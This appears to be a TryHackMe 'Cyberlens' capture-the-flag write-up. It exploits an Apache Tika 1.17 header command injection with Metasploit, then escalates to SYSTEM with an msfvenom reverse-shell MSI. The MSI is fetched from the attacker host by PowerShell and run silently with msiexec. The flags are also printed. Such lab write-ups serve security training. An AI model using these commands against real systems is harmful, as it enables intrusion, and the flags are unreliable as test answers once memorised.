# THM: Cyberlens

## Challenge Details

- **Platform:** [[TryHackMe]]
- **Challenge Type:** [[Web Exploitation]], [[Windows Privilege Escalation]], [[Command Injection]]
- **Difficulty:** Medium
- **Target IP/URL:** `10.10.68.54`
- **Status:** #solved
- **Date Solved:** [[2025-05-28]]

## 🎯 Objective

The Cyberlens CTF involved initial reconnaissance to map the target's services, identifying and exploiting an Apache Tika instance via a command injection vulnerability to gain an initial shell, and subsequently escalating privileges to `NT AUTHORITY\SYSTEM` on the Windows host to retrieve the flags.

## 🛠️ Tools Used

- [[Nmap]]
- [[Gobuster]]
- [[Firefox]]
- [[Metasploit]] (`msfconsole`, `msfvenom`)
- `msiexec`
- [[Python]] (`http.server`)
- [[Netcat]] (`nc`, `rlwrap`)
- [[PowerShell Cheatsheet]]

---

## 🔍 Reconnaissance

The initial phase focused on enumerating open ports, identifying web services, and understanding the target's environment.

### Target Identification

The target IP address was set as an environment variable for convenience:

Bash

```
export TARGET=10.10.68.54
```

### Nmap Scan

A comprehensive `nmap` scan was performed to identify open ports, service versions, and operating system details.

Bash

```
nmap -sV -sC -Pn -oA cyberlens $TARGET
```

**Key findings from the `nmap` report:**

- **80/tcp:** `http` - Apache httpd 2.4.57 ((Win64)). `http-title: CyberLens: Unveiling the Hidden Matrix`.
- **135/tcp:** `msrpc` - Microsoft Windows RPC.
- **139/tcp:** `netbios-ssn` - Microsoft Windows netbios-ssn.
- **445/tcp:** `microsoft-ds?` (SMB).
- **3389/tcp:** `ms-wbt-server` - Microsoft Terminal Services (RDP).
    - RDP info revealed `Target_Name: CYBERLENS`, `Product_Version: 10.0.17763` (Windows Server 2019 / Windows 10, version 1809).
- **5985/tcp:** `http` - Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP): likely [[Commands and Methodologies/3: Exploitation/Service Exploitation/Services/WinRM (5985,5986)/WinRM]].

The OS was confirmed as **Windows**.

### Web Application Analysis (Port 80)

Navigating to `http://cyberlens.thm` (or `http://$TARGET`) in [[Firefox]] revealed a website purporting to be an "image metadata extractor."

### Directory Brute-forcing with Gobuster

`Gobuster` was used to enumerate directories and files on the web server:

Bash

```
gobuster dir -u http://cyberlens.thm -w /usr/share/wordlists/dirb/big.txt -t 40
```

**Key `gobuster` results:**

```
/Images              (Status: 301) [Size: 236] [--> http://cyberlens.thm/Images/]
/css                 (Status: 301) [Size: 233] [--> http://cyberlens.thm/css/]
/images              (Status: 301) [Size: 236] [--> http://cyberlens.thm/images/]
/js                  (Status: 301) [Size: 232] [--> http://cyberlens.thm/js/]
```

The `/js` directory was particularly interesting. Listing its contents by navigating to `http://$TARGET/js` showed:

```
# Index of /js

- [Parent Directory](http://10.10.161.98/)
- [bootstrap.js](http://10.10.161.98/js/bootstrap.js)
- [image-extractor.js](http://10.10.161.98/js/image-extractor.js)
- [jquery-3.4.1.min.js](http://10.10.161.98/js/jquery-3.4.1.min.js)
```

### Examining `image-extractor.js`

The client-side JavaScript code for the image extractor was examined at `http://$TARGET/js/image-extractor.js`.

JavaScript

```
document.addEventListener("DOMContentLoaded", function() {
  document.getElementById("metadataButton").addEventListener("click", function() {
    var fileInput = document.getElementById("imageFileInput");
    var file = fileInput.files[0];

    var reader = new FileReader();
    reader.onload = function() {
      var fileData = reader.result;

      fetch("http://localhost:61777/meta", { // <--- CRITICAL FINDING
        method: "PUT",
        body: fileData,
        headers: {
          "Accept": "application/json",
          "Content-Type": "application/octet-stream"
        }
      })
      .then(response => {
        if (response.ok) {
          return response.json();
        } else {
          throw new Error("Error: " + response.status);
        }
      })
      .then(data => {
        var metadataOutput = document.getElementById("metadataOutput");
        metadataOutput.innerText = JSON.stringify(data, null, 2);
      })
      .catch(error => {
        console.error("Error:", error);
      });
    };

    reader.readAsArrayBuffer(file);
  });
});
```

The `fetch("http://localhost:61777/meta", {` line was a crucial discovery. It indicated that the client-side application was sending uploaded image data to a service running locally on the target machine on port `61777`.

### Identifying Apache Tika

Investigating `http://$TARGET:61777` directly revealed:

```
# Welcome to the Apache Tika 1.17 Server
```

This confirmed the presence of **Apache Tika 1.17**, an open-source content analysis toolkit, running on the target.

---

## 💥 Initial Access: Apache Tika Command Injection

Knowing the specific version of Apache Tika, the next step was to search for known vulnerabilities and exploits.

### Metasploit Exploit for Apache Tika

A quick search in [[Metasploit]] for "Apache Tika 1.17 exploit" yielded a relevant module:

```
1  exploit/windows/http/apache_tika_jp2_jscript  2018-04-25        excellent  Yes  Apache Tika Header Command Injection
```

This module (`apache_tika_jp2_jscript`) specifically targets a **Header Command Injection** vulnerability in Apache Tika.

The exploit was configured and executed in `msfconsole`:

Bash

```
msfconsole
use exploit/windows/http/apache_tika_jp2_jscript
set RHOSTS 10.10.68.54
set RPORT 61777
set LHOST [Your Attacking Machine IP]
set LPORT 4444 # or chosen port
exploit
```

This successfully provided a [[Meterpreter]] shell.

### Retrieving the User Flag

From the Meterpreter shell, a standard command prompt was spawned:

```
meterpreter > shell
```

The user context was identified as `cyberlens`. The `user.txt` flag was located on the user's desktop:

Bash

```
cd C:\Users\Cyberlens\Desktop
dir
```

## 🔑 User Flag

```
THM{T1k4-CV3-f0r-7h3-w1n}
```

---

## 📈 Privilege Escalation: Service Exploitation

With a user-level shell, the objective shifted to escalating privileges to `NT AUTHORITY\SYSTEM`. This typically involves identifying misconfigured services or vulnerable executables.

### Preparing for Payload Transfer

A temporary directory was created on the target machine for payload transfer:

PowerShell

```
C:\mkdir tmp
```

### Generating a Reverse Shell Payload

A Windows x64 reverse shell payload, formatted as an MSI executable, was generated using `msfvenom`:

Bash

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.4.3.134 LPORT=53 -f msi -o reverse.msi
```

### Hosting and Downloading the Payload

A simple [[Python]] HTTP server was started on the attacking machine to host the `reverse.msi` file:

Bash

```
python3 -m http.server 80
```

From the compromised Windows host, [[PowerShell Cheatsheet]] was used to download the `reverse.msi` file into the `C:\tmp\` directory. This is a common and reliable method for transferring files on Windows.

PowerShell

```
powershell -c "(New-Object System.NET.WebClient).DownloadFile('http://10.4.3.134:80/reverse.msi','C:\tmp\reverse.msi')"
```

### Catching the Elevated Shell

A [[Netcat]] listener was set up on the attacking machine to catch the incoming elevated shell:

Bash

```
rlwrap nc -nvlp 53
```

### Executing the Payload for Privilege Escalation

Finally, the downloaded MSI file was executed silently on the target machine using `msiexec`. This triggered the reverse shell as an elevated user, as MSI installations often run with SYSTEM privileges.

PowerShell

```
msiexec /quiet /qn /i C:\tmp\reverse.msi
```

A new shell connected to the `netcat` listener. The `whoami` command confirmed successful privilege escalation:

```
whoami
```

**Result:** `nt authority\system`

### Retrieving the Root Flag

The root flag was located on the Administrator's desktop:

Bash

```
cd C:\Users\Administrator\Desktop
dir
```

## 🏆 Root Flag

The `admin.txt` file contained the root flag:

```
THM{3lev@t3D-4-pr1v35c!}
```

---

## 📚 Lessons Learned

- **Deep Web Reconnaissance:** Don't just rely on default HTTP ports. Analyze client-side JavaScript (`.js` files) for hidden endpoints or interactions with local services.
- **Localhost Services:** Hidden `localhost` services (like the Apache Tika instance on port 61777) are common targets for exploitation.
- **CVE Identification:** Identify specific software versions (e.g., Apache Tika 1.17) and search for known vulnerabilities (CVEs) and existing exploits.
- **Metasploit Efficiency:** Metasploit is highly effective for exploiting known vulnerabilities with pre-built modules and managing shells (Meterpreter).
- **Windows Payload Delivery:** Master techniques for transferring payloads to Windows machines (e.g., `PowerShell.WebClient.DownloadFile`, `certutil`).
- **Windows Privilege Escalation:** Understand common Windows privilege escalation vectors, including how MSI installations can lead to `SYSTEM` privileges when executed by a low-privileged user.
- **`msiexec` Usage:** Learn to use `msiexec` with silent flags (`/quiet /qn /i`) for stealthy payload execution.

---

[[CyberSecurity]], [[Network Scanning]], [[Web Exploitation]], [[Apache Tika]], [[Command Injection]], [[Reverse Shell]], [[Windows Privilege Escalation]]
